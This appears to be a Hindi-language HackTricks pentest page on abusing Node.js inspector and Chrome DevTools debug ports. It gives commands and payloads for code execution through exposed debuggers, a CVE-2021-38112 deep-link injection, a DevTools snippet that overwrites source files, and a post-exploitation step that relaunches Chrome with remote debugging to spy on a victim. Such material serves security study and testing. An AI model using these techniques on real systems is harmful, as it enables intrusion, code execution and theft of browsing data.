# Node inspector/CEF डीबग दुरुपयोग

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **अपनी हैकिंग तरकीबें साझा करें, HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.

</details>

## मूल जानकारी

`--inspect` स्विच के साथ शुरू किए गए Node.js प्रक्रिया एक डीबगिंग क्लाइंट के लिए सुनती है। **डिफ़ॉल्ट** रूप से, यह होस्ट और पोर्ट **`127.0.0.1:9229`** पर सुनेगा। प्रत्येक प्रक्रिया को एक **अद्वितीय** **UUID** भी असाइन किया जाता है।

Inspector क्लाइंट्स को कनेक्ट करने के लिए होस्ट एड्रेस, पोर्ट, और UUID जानना और निर्दिष्ट करना चाहिए। एक पूर्ण URL कुछ इस तरह दिखेगा `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
चूंकि **डीबगर को Node.js निष्पादन वातावरण तक पूरी पहुंच होती है**, इस पोर्ट से जुड़ने में सक्षम एक दुर्भावनापूर्ण अभिनेता Node.js प्रक्रिया की ओर से मनमाने कोड को निष्पादित कर सकता है (**संभावित विशेषाधिकार वृद्धि**).
{% endhint %}

Inspector शुरू करने के कई तरीके हैं:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप एक निरीक्षित प्रक्रिया शुरू करते हैं, तो कुछ इस तरह का संदेश प्रकट होगा:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) आधारित प्रक्रियाओं को डिबगर खोलने के लिए पैरामीटर: `--remote-debugging-port=9222` का उपयोग करना पड़ता है (SSRF सुरक्षा बहुत समान रहती है)। हालांकि, वे **NodeJS** **डिबग** सत्र प्रदान करने के बजाय [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके ब्राउज़र से संवाद करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफ़ेस है, लेकिन इसमें सीधा RCE नहीं होता है।

जब आप एक डिबग किए गए ब्राउज़र को शुरू करते हैं तो कुछ इस तरह दिखाई देगा:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ब्राउज़र, वेबसॉकेट्स और सम-ओरिजिन नीति <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेब-ब्राउज़र में खुली वेबसाइट्स वेबसॉकेट और HTTP अनुरोध ब्राउज़र सुरक्षा मॉडल के तहत कर सकती हैं। एक **प्रारंभिक HTTP कनेक्शन** आवश्यक है **अद्वितीय डिबगर सत्र आईडी प्राप्त करने के लिए**। **सम-ओरिजिन-नीति** वेबसाइट्स को **इस HTTP कनेक्शन** बनाने से **रोकती है**। अतिरिक्त सुरक्षा के लिए [**DNS रिबाइंडिंग हमलों**](https://en.wikipedia.org/wiki/DNS\_rebinding) के खिलाफ, Node.js यह सत्यापित करता है कि कनेक्शन के लिए **'Host' हेडर्स** या तो **IP पता** या **`localhost`** या **`localhost6`** सटीक रूप से निर्दिष्ट करते हैं।

{% hint style="info" %}
यह **सुरक्षा उपाय इंस्पेक्टर का शोषण करने से रोकता है** ताकि कोड चलाने के लिए **केवल HTTP अनुरोध भेजकर** (जो SSRF दोष का शोषण करके किया जा सकता है)।
{% endhint %}

### चल रही प्रक्रियाओं में इंस्पेक्टर शुरू करना

आप चल रही nodejs प्रक्रिया को **सिग्नल SIGUSR1** भेज सकते हैं ताकि वह डिफ़ॉल्ट पोर्ट में **इंस्पेक्टर शुरू करे**। हालांकि, ध्यान दें कि आपको पर्याप्त विशेषाधिकार होने चाहिए, इसलिए यह आपको प्रक्रिया के भीतर की जानकारी तक **विशेषाधिकार प्राप्त कर सकता है** लेकिन सीधे विशेषाधिकार वृद्धि नहीं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
यह कंटेनरों में उपयोगी है क्योंकि `--inspect` के साथ **प्रक्रिया को बंद करना और एक नई प्रक्रिया शुरू करना** **विकल्प नहीं है** क्योंकि **कंटेनर** प्रक्रिया के साथ **मारा जाएगा**।
{% endhint %}

### इंस्पेक्टर/डिबगर से जुड़ें

यदि आपके पास **Chromium आधारित ब्राउज़र** तक पहुँच है, तो आप `chrome://inspect` या Edge में `edge://inspect` एक्सेस करके जुड़ सकते हैं। Configure बटन पर क्लिक करें और सुनिश्चित करें कि आपके **लक्ष्य होस्ट और पोर्ट** सूचीबद्ध हैं (आगे के सेक्शनों के उदाहरणों में से एक का उपयोग करके RCE प्राप्त करने का तरीका निम्नलिखित छवि में देखें)।

![](<../../.gitbook/assets/image (620) (1).png>)

**कमांड लाइन** का उपयोग करके आप एक डिबगर/इंस्पेक्टर से जुड़ सकते हैं:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
उपकरण [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), स्थानीय रूप से चल रहे **inspectors को खोजने** और उनमें **कोड इंजेक्ट करने** की अनुमति देता है।
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
ध्यान दें कि **NodeJS RCE exploits काम नहीं करेंगे** यदि आप [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से एक ब्राउज़र से जुड़े होते हैं (आपको इसके साथ दिलचस्प चीजें करने के लिए API की जांच करनी होगी)।
{% endhint %}

## NodeJS Debugger/Inspector में RCE

{% hint style="info" %}
यदि आप यहाँ Electron में XSS से [**RCE प्राप्त करने का तरीका खोज रहे हैं, तो कृपया इस पृष्ठ को देखें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

जब आप Node **inspector** से **जुड़** सकते हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके हैं, जैसे (ऐसा लगता है कि यह **Chrome DevTools protocol से कनेक्शन में काम नहीं करेगा**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

आप यहाँ API देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
इस खंड में मैं केवल दिलचस्प चीजें सूचीबद्ध करूंगा जिनका उपयोग लोगों ने इस प्रोटोकॉल का शोषण करने के लिए किया है।

### डीप लिंक्स के माध्यम से पैरामीटर इंजेक्शन

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino सुरक्षा ने पाया कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में एक कस्टम URI (workspaces://) रजिस्टर किया था जो पूरी URI प्राप्त करता था और फिर CEF आधारित एप्लिकेशन को एक कॉन्फ़िगरेशन के साथ लॉन्च करता था जो आंशिक रूप से उस URI से निर्मित होता था।

यह पाया गया कि URI पैरामीटर्स URL डिकोड किए गए थे और CEF बेसिक एप्लिकेशन लॉन्च करने के लिए उपयोग किए गए थे, जिससे एक उपयोगकर्ता **`--gpu-launcher`** फ्लैग को **कमांड लाइन** में **इंजेक्ट** कर सकता था और मनमानी चीजें निष्पादित कर सकता था।

तो, एक पेलोड जैसे:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### फाइल्स को ओवरराइट करें

उस फोल्डर को बदलें जहां **डाउनलोड की गई फाइलें सेव होने वाली हैं** और एक फाइल डाउनलोड करें ताकि अक्सर इस्तेमाल किए जाने वाले **सोर्स कोड** को आपके **दुर्भावनापूर्ण कोड** से **ओवरराइट** किया जा सके।
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE और exfiltration

इस पोस्ट के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE प्राप्त करना और आंतरिक पृष्ठों को theriver से exfiltrate करना संभव है।

### Post-Exploitation

वास्तविक पर्यावरण में और **किसी उपयोगकर्ता के PC को समझौता करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप **डिबगिंग सक्रिय और डिबगिंग पोर्ट को पोर्ट-फॉरवर्ड** करते हुए Chrome प्रक्रिया शुरू कर सकते हैं ताकि आप इसे एक्सेस कर सकें। इस तरह आप **Chrome के साथ पीड़ित के द्वारा किए गए सब कुछ का निरीक्षण कर सकते हैं और संवेदनशील जानकारी चुरा सकते हैं**।

गुप्त तरीका है **हर Chrome प्रक्रिया को समाप्त करना** और फिर कुछ इस तरह कॉल करना
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## संदर्भ

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>
